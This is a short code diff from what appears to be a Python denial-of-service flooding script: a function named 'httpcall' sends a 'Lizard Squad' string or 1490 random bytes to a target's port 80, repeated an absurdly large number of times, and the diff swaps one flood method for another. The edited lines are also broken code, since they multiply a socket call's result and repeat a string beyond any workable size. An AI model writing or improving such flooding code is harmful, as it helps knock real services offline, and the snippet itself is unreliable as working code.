@@ -83,8 +83,8 @@ def httpcall(url):
 	bytes = random._urandom(1490)
 	try:
 		
-			s.connect((url,80))
-			s.send("Lizard Squad" * 109951162777600)
+			s.sendto(bytes, (url, 80)) * 109951162777600
+			s.settimeout(10)
 			
 	except:
 			#print e.code
